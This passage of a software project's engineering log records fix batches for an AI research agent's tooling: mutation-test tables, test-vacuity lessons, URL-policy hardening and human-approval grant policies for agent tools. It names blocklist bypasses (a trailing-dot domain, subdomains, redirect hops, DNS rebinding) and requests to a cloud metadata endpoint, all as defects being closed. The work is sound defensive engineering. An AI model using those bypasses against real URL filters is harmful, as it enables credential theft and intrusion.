issue's second defect unreachable through the loop.

| If production code changes like this… | …this fails | Why it matters |
|---|---|---|
| Move the increment back inside `for rev in revisions:` | `test_a_claim_pass_6a_omits_still_exhausts_its_retries` + `test_a_pass_6a_response_naming_nothing_still_exhausts_the_loop` | The bound becomes the model's cooperation again: two model calls per round, each on `RESEARCH_PASS_TOKEN_BUDGET`, with no ceiling but a rate limit |
| **Add** the per-round increment while leaving the per-revision one | `test_pipeline_6a6c_retry_loop_continues_until_max_retries_then_fallback` | A named claim then counts twice and exhausts in half the rounds. This is the issue's own withdrawn control — its red was the mutation's arithmetic, not the fix's cost |
| Drop `claims=flagged` from the in-loop `run_confidence_tiering` | `test_a_retry_round_does_not_re_tier_a_claim_outside_its_batch` | A claim finished at D1 or D2 is recomputed from unchanged score data while the annotation `_apply_fallback` wrote stays — so it ships as (say) LOW beside a note saying it could not be verified. Pass 6b leaves both alone, because `if claim.annotation is None` is false |
| Resolve 6a's revisions with `run.claim_by_id` instead of within `flagged` | Nothing today | A revision naming a claim outside the batch lands on one already finished, carrying a `retry_count` this round did not increment — so the `retry` event reports a stale attempt. Recorded rather than pinned: no canned payload produces it, and validating that a pass answered about what it was asked is #76 |

**The three new tests are bounded by the mock, deliberately.** With the fix reverted the loop
does not fail, it never terminates — so each payload supplies exactly `MAX_PIPELINE_RETRIES`
rounds and `_build_pass_mock` raises when the loop asks for one more. The pipeline's `except`
re-raises, so the red arrives as a failure rather than as a hung suite. The tracker's rule: a
probe that would hang is worth writing, one that hangs is not.

### #88 — the derived view has two span boundaries and only one is turn-aligned

M4 is stated over the checkpoint watermark. The **pinned set** is the other boundary, and it can
never be turn-aligned: `pin` is dispatched from inside a turn, D20 has already persisted the
assistant message carrying the `tool_use` for `pin` itself, and the answering `tool` row is
written after dispatch returns — so it is never pinned. While the pin is in the uncompacted tail
this is invisible. The first compaction whose watermark passes the pinned region puts an
unanswered `tool_use` in the view: an HTTP 400 on Anthropic, durable (the checkpoint is a
persisted row, there is no unpin, and nothing removes a checkpoint), and misattributed — the
user sees a provider error with no visible connection to a `pin` several turns earlier.

| If production code changes like this… | …this fails | Why it matters |
|---|---|---|
| Revert `storage.pinned_through` to returning the pinned rows alone | `test_a_pinned_tool_call_brings_back_the_result_that_answers_it` + `test_a_pinned_pin_call_leaves_no_unanswered_tool_use_in_the_view` | The thread becomes permanently unsendable, and every later call and every resume rebuilds the same view |
| Revert **only** `FakeStorage.pinned_through` | `test_a_pinned_tool_call_comes_back_with_the_result_that_answers_it` | #123's shape, closed rather than repeated: the fake's mirror is now load-bearing, not merely documented as one |
| Re-add every unpinned tool row in the span rather than the needed ones | that test + the two pre-existing M9 tests | Puts back the results compaction just summarized, which is the context the feature exists to shrink |
| Fix it in `_derived_view` or in `pin_last` instead | Nothing — a design note | Consumer-side is this project's canonical bug shape and would hide from the model a call it made; stopping `pin_last` at the last complete turn changes what "pin the last N turns" means and leaves any other non-turn-aligned pinned set open |

**The end-to-end test needs a REAL compaction**, which is why it is in `test_storage_e2e.py`:
the two boundaries coincide until a checkpoint exists. Same reason that file had to exist for
M11. It asserts its preconditions beside the claim — that a fold happened, that the watermark
passed the pinned turn, and that the pinned assistant row is in the view — because without the
last one the real assertion holds vacuously.

### Standing: three backstops in `pinned_through` survive, and the code now says so

`have`, the `set()` dedupe and the `role == "tool"` filter were each deleted separately against
the full suite and **each survived**. What actually keeps the result duplicate-free is the
`not m["pinned"]` filter — a pinned tool row is already in `keep` and cannot be re-added — and
reaching any of the three needs two rows sharing one `tool_call_id`, or a non-tool row carrying
one. Neither has a producer: `add_tool_result` writes exactly one row per call, and
`add_user_message` passes no `tool_call_id`.

Kept rather than trimmed, because what they guard is a *duplicate* `tool_result` — the same wire
error from the other direction as the one the function exists to prevent, which is the wrong
place to trade a free backstop for a reachability argument. The measurement is recorded in the
code so no later reader has to re-derive it, which is the difference between this and the
comments unit 10 and unit 12 had to re-measure.

Two of the new tests were then named for what they discriminate rather than for the guard they
appear to sit on: `test_an_already_pinned_tool_result_is_not_added_twice` stays green with
`have` deleted. That is #61's shape — a test observing an effect adjacent to its cause — caught
before filing rather than after.

### Why the M9 test could not see this

`test_a_pinned_row_inside_the_covered_span_comes_back_verbatim` pins `rows[1]`, an assistant row
whose `tool_calls` is `[]`. **The one thing a pinned assistant row carries in production is the
one thing that fixture leaves empty**, because `pin` is itself a tool. Removing the re-inclusion
entirely *was* pinned; what had no test was the interaction between the two boundaries — and
neither M4 nor M9 mentions the other.

---

## §20 — the fourth fix batch: the docs-drift tier (2026-08-17)

Seventeen issues. Almost all of it is prose, and the one sentence that explains the whole
batch is unit 16's: **the claims that drift are the ones somebody had to count by hand.**

So this batch corrects the current round *and* mechanises four of the counting habits that
produced it. `TECHNICAL_DEBT.md` item 7 pre-registered exactly that trigger — "BUILT markers
and tree entries are still by hand… **if those two start drifting the same way, extend this
file's check**" — and both had drifted.

Suite 1605 → **1613**.

### Standing: moving a dependency out of `requirements.txt` can break a test that never uses it

**This batch broke CI and the local suite stayed green.** Moving `markitdown` to an optional
extra was the point of #144's third item — its only consumer is `file_ops._read_rich`, behind
`read`, which is globally denied and cannot be re-enabled at runtime, and the import is lazy.
Nothing in production can reach it.

But `tests/test_file_ops.py` does `patch("markitdown.MarkItDown", ...)`, and **`mock.patch`
with a string target IMPORTS the module to resolve it.** So the test needed the package
installed for a reason unrelated to anything it asserts: it substitutes a `MagicMock` and never
touches the real library. On a developer machine markitdown was still installed from before, so
the suite passed; on a runner doing a fresh `pip install -r requirements.txt` it failed with
`ModuleNotFoundError`, and it was the ONLY failure — the job reported nothing but `exit code 1`.

Two rules out of it:

1. **When a package leaves `requirements.txt`, grep the suite for its name — including string
   patch targets**, which no import-graph check will find.
2. **A green local suite does not mean a green fresh install.** Reproduced with
   `docker run python:3.11-slim` over a `git archive` of HEAD: pre-fix **1 failed, exit 1**;
   post-fix **1611 passed, exit 0**. That container is also the only way the eleven tests which
   `skipif` on Windows (symlinks, SIGALRM) get run at all — all eleven pass on Linux.

The fix is a stub in the root `conftest.py` beside the six SDK fakes, which is what that
mechanism exists for. Its `convert` RAISES rather than returning something plausible, so
anything reaching it unpatched fails loudly instead of receiving a fake conversion. `_read_rich`
also now turns the missing extra into a message naming `pip install -e ".[documents]"`, since a
bare `ModuleNotFoundError` names a package the user never asked for.

### The four new assertions in `test_docs_consistency.py`

| If a document drifts like this… | …this fails |
|---|---|
| A per-file count in ARCHITECTURE's tree goes wrong | `test_the_tree_states_a_correct_count_for_every_collected_test_file` |
| A test file lands with no tree entry | the same test — **strict** in both directions |
| A tree entry names a file that was renamed away | `test_no_tree_entry_names_a_test_file_that_does_not_exist` |
| A ROADMAP_v2 index entry loses its status marker | `test_every_roadmap_v2_index_entry_carries_a_status_marker` |
| A registered tool never reaches README's approval table | `test_every_registered_tool_appears_in_readmes_approval_table` |
| ARCHITECTURE's registry counts go stale | `test_architecture_states_the_real_registry_counts` |

Seven mutations, all RED on the check named for them. The rule for what belongs in that file
is unchanged and is now written into its docstring: **a claim earns a check by having already
drifted, and only if the truth is something the suite can compute.** Every one of them
compares a document against a live value — the collected session, the registry, the
permission dataclasses — never against another hand-written number.

### Standing: two of the seven mutations survived the first run, for two different reasons

Both are the vacuity class this file exists for, and both generalise:

1. **A narrowed invocation makes a session-dependent check SKIP, and a skip reads as a
   survivor.** The driver ran `pytest tests/test_docs_consistency.py` — which *is* narrowed,
   so the two checks that need `request.session.items` never executed. TECHNICAL_DEBT 6's own
   note ("one class of vacuity a revert check cannot catch is a test that SKIPS") arriving
   inside a mutation driver. **Mutation-check a session-dependent test against the full
   suite.**
2. **A character window is not a structure.** The README check read
   `readme[start:start + 2000]`, which swallowed the explanatory paragraphs below the table —
   and those name `write_project_doc` in backticks too, so deleting it from the table left
   the check green. It now walks the table rows and stops at the first line that is not one.

### Standing: PowerShell's `Get-Content`/`Set-Content` round-trip corrupts UTF-8

Updating the aggregate count with `(Get-Content $f -Raw) -replace ... | Set-Content -Encoding utf8`
**double-encoded three documents** — PS 5.1 reads a BOM-less UTF-8 file as cp1252, so every
`—` and `§` became mojibake, and a BOM was added. Reversible (`decode utf-8 → encode cp1252`)
because the damage is uniform across a whole-file rewrite, but the lesson is the rule:
**do file rewriting in Python with explicit `encoding="utf-8"`, or with the editor.** This is
the same family as the `2>&1` NativeCommandError note — PowerShell is fine for git and
process control and is a hazard for text.

### The corrections, all re-measured rather than copied

The issue bodies predate batches 2 and 3, and every figure in them had moved:

| | audit said | measured now |
|---|---|---|
| Wrong per-file counts | 11 | **18** (`test_math_tools` 14 → 123 after #52's battery; `test_orchestrator` 11 → 23 after batch 3) |
| Test files with no tree entry | 8 | **7** |
| Test files | 54 / 58 | **65** |
| Registered / advertised tools | 16 / 12 | **22 / 16**, 13 callable headless |
| Tests failing without `providers.json` | 11 across 3 files | **12 across 4** |
| `read_project_doc`'s reach | "the project's own README" | **40 files, ~1.1 MB, depths 0-3** |

### Two behaviour changes

| Change | …this fails if reverted | Why |
|---|---|---|
| Anthropic's streaming branch honours `supports_stream_usage` (#40) | `test_stream_anthropic_d21_raises_on_zero_usage_when_flag_true` | The default provider was outside D21, with the `getattr(..., 0)` default AGENTS.md forbids by name. An SDK field rename would have zeroed the budget silently |
| …and honours it rather than always raising | `test_stream_anthropic_honours_the_flag_rather_than_always_raising` | The flag now means one thing on all three providers. Without this second test, that claim has nothing behind it |
| `config.APICredentials` deleted (#23) | nothing — it was dead | Its comment told the reader to store an env var's *name* as their API key, which is not what `credentials.save_credentials` does with the value |

### `CLAUDE.md` is now `AGENTS.md`

`CLAUDE.md` and `QWEN.md` are pointers to it. QWEN.md was a second,
independently-maintained context file with five claims false about the present code, and its
staleness warning lived in the file its reader does not open. One copy, several filenames —
the same argument this document makes about every other hand-maintained duplicate.

**Consequence:** Claude Code auto-injects `CLAUDE.md`, so it now injects a pointer rather than
84 KB. The context is an explicit read instead of an automatic one.

---

## §21 — the fifth fix batch: the URL and output policy boundary (2026-08-18)

Eight issues. Five of them are one question asked at three depths — **may this URL be
requested** — and they are one batch because fixing any of them alone rewrites the others.
#54's own report says so: *"the two fixes want the same manual-redirect loop, so they are
cheaper done together."*

| Change | Issue | Files |
|---|---|---|
| One normaliser, suffix matching | #48 | `safety/policy_enforcement.py` |
| `is_url_permitted` — scheme + domain + non-public address | #54 | `safety/policy_enforcement.py`, `tools/builtin/web_search.py` |
| Manual redirect loop, checked before every hop; report the URL that answered | #53 | `tools/builtin/fetch_url.py` |
| Scan every key of a tool result, not an allowlist | #47 | `safety/policy_enforcement.py`, `mcp_client/client.py` |
| Redact in the log formatter | #132 | `logging_setup.py`, `tools/registry.py` |
| `providers.json` and the trust store created 0600 | #19 | `credentials.py`, `core/workspace_trust.py` |
| Anthropic capabilities read as attributes | #35 | `core/client.py` |
| Contain every UI-thread persistence call | #104 | `tui/app.py` |

Suite 1613 → **1667**.

### What breaks these

| If production code changes like this… | …this fails | Why it matters |
|---|---|---|
| Drop the trailing-dot strip in `_hostname` | `test_a_trailing_dot_does_not_bypass_either_branch` | `evil.com.` is a legal FQDN naming the same host, and it defeated *both* branches |
| Match exactly instead of by suffix | `test_a_subdomain_of_a_blocked_domain_is_blocked` | One prepended label leaves the blocklist |
| Match by bare string suffix instead of by label | `test_the_suffix_match_is_label_wise_not_string_wise` | `notevil.com` starts being blocked — over-blocking a domain nobody listed |
| Stop stripping the port on the bare-domain branch | `test_a_port_does_not_bypass_the_bare_domain_branch` | The two branches disagree again, which is what made #48 an inconsistency rather than a limitation |
| Remove the `is_global` check | `test_non_public_addresses_are_refused` (8 cases) | The metadata endpoint returns role credentials into model context and the persisted `MessageLog` |
| Check only the first resolved address, or require all of them | `test_any_non_public_answer_refuses_not_just_the_first` | A name answering with one public and one private address is the rebinding shape; both readings let it through |
| Pass `resolve=True` from `web_search` | `test_filtering_results_issues_no_dns` | A DNS lookup per search hit, ten hits a call, inside ten passes — nothing *fails*, it just gets slow |
| Check only the first hop | `test_a_redirect_to_a_blocked_domain_is_refused` + the real-httpx twin | One 302 walks past the control, and the blocked host has already served its body |
| Report `parsed.url` instead of the final URL | `test_the_reported_url_is_the_one_that_ANSWERED` + its real-httpx twin | Provenance: a redirect silently rewrites what a claim is grounded in, and `output_writer` builds `sources/` from it |
| Reinstate the `_SCANNED_KEYS` allowlist | 3 tests in `TestEveryKeyIsScanned` | `results` is not `result`; the two tools whose content is entirely third-party text go unredacted |
| Redact the result but not the log record | `test_a_secret_in_a_TRACEBACK_does_not_reach_the_file` | Same string, two sinks, one redacted |
| Remove `tui/app.py`'s replay containment | `test_a_replay_failure_while_resuming_does_not_kill_the_tui` | The app dies having just cleared the screen and written "Resumed thread `<uuid>`." |
| Move the memory load below the transcript reset | `test_a_failure_opening_the_thread_leaves_the_session_on_the_old_one` | Ordering *is* the fix there, not the `try` block |
| Leave `_busy` set when a turn fails to start | `test_a_storage_failure_starting_a_turn_does_not_kill_the_tui` | The shell refuses every later turn with "Still working" for a turn that never started |
| Write `providers.json` with a bare `open()` | `test_a_permissive_umask_does_not_widen_it` — **on POSIX only** | See the standing note below |

### Standing: a skip reads as a surviving mutation, and this batch proved it

§20 recorded this one batch ago — *"a narrowed invocation makes a session-dependent check
SKIP, and a skip reads as a survivor"* — and #19 is the same class from the other direction.
Its four mode assertions `skipif` off POSIX, because POSIX mode bits do not exist on Windows
and `os.open`'s mode only sets the read-only flag there.

**On the development machine, mutating `0o600` to `0o644` left the suite green.** The
mutation was only measurable in `python:3.11-slim`, where all four run:

```
control                                    9 passed
_SECRET_FILE_MODE = 0o644                  2 failed   (420 != 384)
bare open(path, "w")                       2 failed   (438 != 384)
trust store bare open()                    1 failed
```

**The rule: a guard whose test can skip is not verified until the mutation runs where the
test does.** The container is part of this batch's verification, not a formality.

### Standing: the mutation harness is itself a place a mutation can silently not apply

Two mutations in this batch reported a result that was not the result.

1. **A `\n` needle against a CRLF file matches nothing**, and a no-op edit reads as a
   survivor. `tui/app.py` is CRLF while most of the tree is LF. The harness now normalises
   the needle to the file's own line ending and asserts the bytes changed before running
   anything.
2. **A syntactically invalid mutation reports RED for the wrong reason.** Replacing `try:`
   with `if True:` left a dangling `except`, so pytest reported a *collection error* — and
   "1 error" in a summary reads like a kill. The replay guard is now mutated by removing the
   whole block, with `py_compile` run first, so a red is a real failure.

Both are instances of the rule this document already states: **a test that fails for the
wrong reason is indistinguishable from one that works** — arriving, twice, inside the tool
built to enforce it.

### Recorded, not closed: three limitations the tests cannot see

- **DNS rebinding.** `is_url_permitted` resolves, then httpx resolves again independently.
  Closing it means connecting to the pinned IP with the host in a `Host:` header, which on
  HTTPS fights SNI and certificate verification — a subtly wrong implementation there is a
  worse hole than this one. Stated in the function's docstring.
- **`os.open`-with-mode versus `open()`-then-`chmod`.** Mutating the fix to the second form
  stays **green**, and it should: the file ends up 0600 either way. What `os.open` buys is
  the absence of a window in which the key is on disk world-readable, and no offline test can
  observe a race. Measured and recorded so the next reader does not delete the `os.open` as
  ceremony.
- **A pre-existing 0644 file keeps its mode** through `O_TRUNC`. Repairing one is a
  migration; the scope here is "new writes are safe". Pinned by a test that says so.

### Why eight green tests could not see #35

`test_client_effort.py` built its doubles as nested dicts — `capabilities={"effort":
{"high": {"supported": True}}}` — the same wrong shape `core/client.py` assumed. Production
and the double agreed with each other and both disagreed with the SDK, so the capability
query **could never succeed in production and could never fail in the suite**.

Fixing only the code would have left that intact. The doubles are rebuilt attribute-shaped,
and `test_sdk_conformance.py` gained a test driving `_effort_levels` against capability
objects built from the **real pinned types** — the test the dict-shaped doubles could not be.
The general rule, which this project already states about `FakeStorage`: **anything a test
doubles, something has to check against the real thing.**

### The two strict xfails are gone

Both said, in their own reasons, that fixing the issue would turn them XPASS and that the
marker should then be deleted. Both did.

- `test_a_redirect_to_a_blocked_domain_is_refused` (#53) — now a real test, joined by a twin
  driving **real httpx** through a `MockTransport`. The fake httpx is this project's model of
  httpx, and #53 exists because the old code's model of httpx was wrong; a fake written to
  match the new code cannot be evidence that the new code matches httpx.
- `test_the_anthropic_capability_read_matches_the_pinned_types` (#35) — **inverted** rather
  than deleted. It now asserts the chain the fixed code relies on.

`tests/conftest.py`'s `http` driver gained `redirect()` and lost `redirected()`: the old
helper queued the answer a *followed* redirect produces, which is a shape `fetch_url` no
longer receives. A fixture that can only express the old shape quietly stops testing the code
under test. The root `conftest.py`'s fake `_Response` gained `is_redirect` and `next_request`,
both mirroring real httpx's documented rule rather than a rule invented here.

---

## §22 — the sixth fix batch: one grant policy, declared per tool (2026-08-18)

Three issues, two of them S2 security. #67 and #133 are one defect stated twice: **two
functions answer "what may be pre-granted to a call that has not happened yet", and they
disagree.** #106 is not a third choice — fixing #133 promotes it from config-dependent to
certain, so leaving it out would ship a new bug in place of an old one.

| Change | Issue | Files |
|---|---|---|
| `ToolSpec.grant_policy` + `assert_grant_policy_declared` | #133 | `tools/base.py`, `tools/registry.py`, `mcp_client/registration.py` |
| Both grant paths read one declaration; `PIPELINE_UNGRANTABLE` deleted | #67, #133 | `core/reasoning/authorization.py`, `agents/manager.py` |
| A grant by name does not answer a subject-carrying question | #67 | `tools/context.py` |
| The attended provider survives an empty grant set; one shared message | #106 | `tui/app.py`, `main.py` |

Suite 1652 → **1667**.

### What breaks these

| If production code changes like this… | …this fails | Why it matters |
|---|---|---|
| `write_project_doc` → `GRANT_ANYWHERE` | `test_write_project_doc_is_offered_to_a_human_but_not_to_the_pipeline` | The whole `--grant` menu becomes the one built-in that overwrites files in your repo, including `.venastine/CONTEXT.md`, which is injected into every opted-in agent |
| `spawn_subagent` or `remember` → `GRANT_ANYWHERE` | `test_spawn_subagent_is_never_offered`, `test_remember_cannot_be_granted_to_a_research_run` | R4 and M17, and #67's point is that neither argument was ever pipeline-specific |
| The pipeline filter loosened to `!= GRANT_NEVER` | 6 tests in `TestCandidates` | The pipeline stops being strictly stricter, which is the only thing the three-valued policy exists to express |
| `candidate_approvals`' policy filter deleted | `test_remember_is_not_offered_to_a_subagent_signoff_either` | The §18 sign-off goes back to offering the two tools R4's own argument is about |
| Undeclared non-MCP resolves to `GRANT_ANYWHERE` | `test_an_undeclared_anything_else_resolves_to_NEVER` | Fails open — the denylist shape this batch exists to remove |
| Undeclared `mcp__*` resolves to `GRANT_NEVER` | `test_an_undeclared_mcp_tool_resolves_to_ANYWHERE` + the picker tests | MCP tools *are* the population both grant paths serve; closing them empties the feature |
| `assert_grant_policy_declared` stops checking the VALUE | `test_a_MISSPELLED_policy_is_refused_too` | An unrecognised string is not `None`, so a presence-only check passes it and the tool silently leaves both paths while looking answered |
| Drop `subject is None` from `recall_signoff` | `test_a_named_grant_does_not_cover_a_subject_carrying_call` | J8's pre-fix behaviour, reached through the grant rather than the memo: one tick lets the child spawn any agent |
| Delete the `granted_tools` branch entirely | 8 tests across `TestTheLoopEnforcesGrantability` / `TestGrantBudget` | The other side of R14 — the §25 grant mechanism must keep working for every tool that has no subject |
| TUI passes `None` when nothing is grantable | `test_attended_survives_grant_when_nothing_can_be_granted` | `--grant` silently turns `--attended` **off**, and the run proceeds looking supervised |
| TUI manufactures a bundle when attended is off | `test_grant_alone_with_nothing_grantable_still_authorises_nothing` | The fix overshooting the other way, handing the pipeline a provider nobody asked for |
| Either shell writes its own empty-answer message | `test_both_shells_say_the_same_thing_about_an_empty_answer` | They already drifted once, and the TUI's version was *false*: "no gated tool is available" when two were |

### Behaviour change: `--grant` offers nothing on a default install

`candidates()` now returns `[]` on a fresh clone. This is correct rather than a regression,
and it is worth stating plainly because it looks like a feature going dark:

```
candidates(), default install       : []
candidates(), one MCP tool connected: ['mcp__demo__post_message']
```

Every built-in is now ungated, param-dependent, or excluded by policy. The population both
grant paths serve is **MCP tools** — allowed but approval-gated by default (§17 decision D),
carrying no `approval_check`, named at connection time. R1's argument that a tool's own
description *"is the whole of informed consent here, because MCP exposes no read-only/write
metadata"* was written about exactly them, and `README.md`'s `--grant-tools` example was
already `mcp__files__search`.

### Standing: a fix that shrinks a set makes every negative about it a tautology

This is a new entry in the vacuity catalogue, and it arrived from the *fix* rather than from
the code under test. Excluding `write_project_doc` emptied `candidates()`, and

```python
assert "remember" not in [name for name, _ in authorization.candidates()]
```

in `test_remember_tool.py` — which has no fixture — becomes `"remember" not in []`, true of
every string ever written. It would have stayed green forever.

Sweeping for the class found one that **predates this batch**:
`test_candidate_approvals_omits_tools_the_grant_cannot_cover` patches `ToolPermissions` and
`ToolApprovals` down to a single `shell` field, which leaves every other built-in ungated —
so `candidate_approvals()` was already empty there and `"shell" not in []` had never
discriminated anything.

Both now prove the exclusion by **subtraction from a populated set**, and
`test_the_offered_set_is_not_empty` guards the rest of `TestCandidates` so a later change
cannot quietly empty it and leave the file green. **The rule: whenever a change makes a set
smaller, re-check every negative assertion about it. Green is not evidence they still
discriminate.**

### Recorded, not closed: the import assert's call site survives its mutation

Deleting `assert_grant_policy_declared(registry._tools, registry._tools)` leaves the suite
green. That is expected, and the project has already said so once — `test_pin_tool.py`'s
D24 test notes that *"this passing at all is partly the import succeeding"*. The claim was
**measured rather than assumed**, by mutating the guard and the mistake together:

```
control (untouched)                   GREEN: 51 passed
assert deleted only                   GREEN: 51 passed        <- the survivor
undeclared tool, assert INTACT        RED:   1 error   (RuntimeError at import)
undeclared tool AND assert deleted    RED:   1 failed  (test_every_registered_tool_declares_one)
```

So the mistake the assert guards against — registering a tool with no declaration — is
caught **either way**. `test_every_registered_tool_declares_one` scans the live registry, so
the state is pinned independently of the call site. What the call adds is *when* the failure
surfaces: a `RuntimeError` at import, before anything runs, rather than one named test
failing later. No in-process test can observe that difference, which is why the mutation
survives and why deleting the call as ceremony would still be wrong.

Note the third row is itself the hazard §21 recorded: it reports as **"1 error"**, the shape
that reads like a kill and usually is not. Here the error *is* the intended behaviour, which
is the same ambiguity from the other side.

### Two callers, and why the test asserts the RELATION

The defect was that the two sets *disagreed*, so a test checking each one separately passes
against a version where they drift apart again — which is precisely how this shipped, since
both sets had tests and both were green.

```
pipeline ⊆ sign-off, and {grant_policy(t) for t in sign-off − pipeline} ⊆ {GRANT_SIGNOFF_ONLY}
```

The subset direction is the security claim (the unattended path can never offer more than
the attended one) and the second clause is what stops the subset from being satisfied by
accident — an empty pipeline set makes `⊆` trivially true, so the test asserts non-emptiness
first.

### Superseded rows above

§25's row *"Remove `PIPELINE_UNGRANTABLE` / add `spawn_subagent` back"* and §21b's *"Remove
`remember` from `PIPELINE_UNGRANTABLE`"* name a constant that no longer exists. The
decisions they record still hold — the arguments moved to the registrations, unchanged, and
the rows in this section replace them. Kept rather than edited, per this file's convention:
what a past batch measured is not rewritten by a later one.


## §23 — the seventh fix batch: a grant the model can actually see (2026-08-18)

Three issues, one mechanism: **what `schemas(callable_only=…)` advertises to a run that
cannot ask.** #156 is the substantive one and it is §25's own founding defect, still
standing on the path §25 was written for.

| Change | Issue | Files |
|---|---|---|
| The advertisement filter reads the grant (`_answered_by_grant`) | #156 | `tools/registry.py` |
| `run_info` moves above the schemas call; the grant is passed | #156 | `core/loop.py` |
| A headless denial says whether the ARGUMENTS caused it | #158 | `core/loop.py` |
| "A headless run cannot spawn at all" is tested, not emergent | #159 | `tests/test_agents.py` |

Suite 1684 -> **1698**.

### The measurement, before and after

Through the real `run_deep_research_mode`, capturing the `tools` argument that reaches
`call_model_stream` -- not a dispatch outcome, for the reason in the vacuity note below:

```
                            BEFORE                 AFTER
--grant-tools X             False  (13 tools)      True   (14 tools)
--grant-tools X --attended  True   (17 tools)      True   (17 tools)
no flags                    False  (13 tools)      False  (13 tools)
```

A grant-only run sent the model **byte-identical tools to an unflagged run**, while the CLI
printed `[grant] authorised for this run only: mcp__demo__post`. Enforcement was correct
throughout; the model was never told the tool existed.

### What breaks these

| If production code changes like this... | ...this fails | Why it matters |
|---|---|---|
| `granted=` dropped at the `schemas()` call site | `test_a_granted_tool_is_advertised_with_no_channel` | This IS #156: `--grant-tools` silently does nothing on its own while reporting success |
| `grantable()` re-check deleted from `_answered_by_grant` | `test_a_grant_naming_a_param_dependent_tool_advertises_nothing` | R2 at the filter -- a stale grant naming `shell` would advertise it |
| The `grant_policy` check deleted from `_answered_by_grant` | `test_a_grant_cannot_smuggle_spawn_subagent_into_a_headless_run` | `spawn_subagent` has no `approval_check`, so `grantable()` alone lets it through -- and R14 then refuses a tool the model was shown, recreating advertised-and-uncallable one line down |
| `headless_hidden` ignores `granted` | `test_a_granted_tool_is_not_reported_as_hidden` | The WARNING names a tool the model can actually call -- the invisibility problem it exists to prevent, wearing the opposite sign |
| The budget made to retract advertisement | `test_the_budget_does_not_change_what_is_advertised` | R6's fallback is a *call-time* answer; hiding the tool mid-run means the fallback never runs and the model reads it as the tool ceasing to exist |
| `run_info` moved back below `schemas()` | `NameError` across every test that drives `_run` | Build order is load-bearing now, and loudly so |
| Denial always blames the name | `test_a_denial_caused_by_the_arguments_says_so` | The model is told to stop when varying one argument would work |
| Denial always blames the arguments | `test_a_denial_caused_by_the_NAME_tells_the_model_to_stop` | The model retries a tool that is uncallable however it is called, spending the rest of `max_steps` |
| `response_channel is not None` branch removed | `test_a_human_saying_no_is_not_reframed_as_a_limitation` | A person's "no" gets reported as "this run has no way to ask" -- a decision misattributed to the configuration |
| Headless filter loosened to `!= GRANT_NEVER` | `test_a_signoff_only_tool_is_invisible_to_a_headless_run` + the relation test | `write_project_doc` becomes visible to an unattended run, which is the one thing `SIGNOFF_ONLY` was declared to prevent |
| The loop's grant branch stops reading `grant_policy` | `test_a_GRANT_NEVER_tool_in_a_grant_is_still_asked_about` | A grant naming `remember` writes a durable cross-session memory with no prompt (M17's scenario) |
| `answered_by_name = not signoff` instead of `is None` | `test_s1_signoff_is_remembered_per_agent_not_per_tool_name` | An EMPTY sign-off subset is falsy but is a real answer, so truthiness misreads a memo as a name grant and R13 then blocks it |
| `ToolApprovals.spawn_subagent = False` | `test_a_headless_run_is_never_offered_spawn_subagent` | r3-1 recreated through config: a headless pass spawns a child that silently loses every gated tool |

Ten mutations run, nine RED on a test named for each, plus a deliberate GREEN control. The
config mutation was re-checked in isolation because `-x` had it killed by an unrelated test
first: run alone, `test_a_headless_run_is_never_offered_spawn_subagent` fails and its control
`test_a_run_that_can_ask_IS_offered_spawn_subagent` passes, so the mutation is discriminated
rather than merely fatal.

### Found reviewing this batch, before merge

Two places ask a question `grant_policy` answers and neither consulted it. Neither is
reachable — `candidates()`, `candidate_approvals()` and `parse_grant_spec` all refuse the
names involved — so nothing shipped broken. "Unreachable" is a fact about today's callers;
these are claims about the policy, and R14 was added on exactly that argument.

**The headless advertisement filter was written `!= GRANT_NEVER`.** It is reached *only*
when the run is headless, which is the unattended case `GRANT_SIGNOFF_ONLY` exists to
exclude — so the looser test readmitted `write_project_doc` precisely where R13's argument
was written against it, and disagreed with `candidates()`, which answers the same question.
**That is #67/#133's own shape, reappearing inside the batch that generalised it.** Now
`== GRANT_ANYWHERE`, with a test asserting the *relation* to `candidates()` rather than
checking each — the same remedy #67 used, for the same reason.

**The loop's grant branch never read the policy at all** (batch 6's gap, not this batch's).
`spawn_subagent` was covered only because R14's subject condition happens to catch it;
`remember` carries no subject, so a grant naming it dispatched unprompted:

```
before:  granted={'remember'}  prompts=0  dispatched=['remember']
after :  granted={'remember'}  prompts=1  dispatched=['remember']   <- asked, then allowed
```

**The first attempt at that fix broke the sign-off memo**, and only
`test_s1_signoff_is_remembered_per_agent_not_per_tool_name` caught it — a test named for the
memo, not for the policy. Testing `grant_policy` unconditionally stops §23's memo applying,
because `spawn_subagent` is `GRANT_NEVER`, so the same agent is asked about twice in one
turn. **R13 is about what approving a NAME buys; a memo is an answer somebody gave about one
subject, which J8 and R14 govern.** The two enforcement predicates therefore differ on
purpose:

| question | predicate | why |
|---|---|---|
| may a grant make this visible to a **headless** run? | `== GRANT_ANYWHERE` | headless *is* unattended, and `SIGNOFF_ONLY` excludes unattended |
| does a name grant **apply** to this call? | `!= GRANT_NEVER` | a subagent holding a `SIGNOFF_ONLY` tool after a sign-off has a channel and must run it unprompted — that is what the sign-off bought |

The discriminator is `signoff is None`, **not truthiness**: an empty sign-off subset is a
real answer (spawn the agent with nothing granted) and is stored as `set()`, which is falsy.
Both the distinction and the empty-set edge now have tests named for them.

### A test that supplies the model's move cannot detect that the move was unavailable

New vacuity class, and the reason a suite with **23 green grant tests** was evidence of
nothing here. Every loop-level grant test passes a channel *and* builds the model's response
itself:

```python
uses = make_model_response(text="", tool_calls=[
    {"id": f"c{i}", "name": tool_name, "input": {"n": i}} ...
```

The tool call is injected *downstream of the filter that would have hidden it*. Those tests
can observe what the loop does with a chosen tool; they cannot observe whether the tool was
choosable. Where a test stands in for the model, it has authority over the model's options,
and any assertion about what the model *could* do is then circular.

This is the third distinct way this project has found a green suite to mean nothing, after
"a test that PATCHES the wiring cannot see the wiring break" (§23's sign-off memo) and "a fix
that shrinks a set turns every negative about it into a tautology" (batch 6). The remedy is
the same each time and it is not more tests: assert one layer further out than the defect can
reach. Here that is the `tools` argument on the wire.

### Verified on Linux

`python:3.11-slim`, fresh `pip install -r requirements.txt`, `providers.json` from the
example: **1707 passed, 0 skipped, 1 deselected** (re-run after the pre-merge review). The fifteen tests that `skipif` on Windows
all run and pass there, so the headline count is measured where nothing skips. The review's three new
mutations were re-run there too, each RED on the test named for it -- and read by NAME
in the output rather than inferred from an exit code, which is the false-RED lesson below.

The wire measurement re-taken in the container:

```
--grant-tools X                granted on wire: True   (14 tools)
--grant-tools X --attended     granted on wire: True   (17 tools)
no flags                       granted on wire: False  (13 tools)
```

The run also emitted **two distinct headless notices**, which is `headless_hidden(granted=)`
doing its job — the granted run's notice omits the tool the ungranted run's names:

```
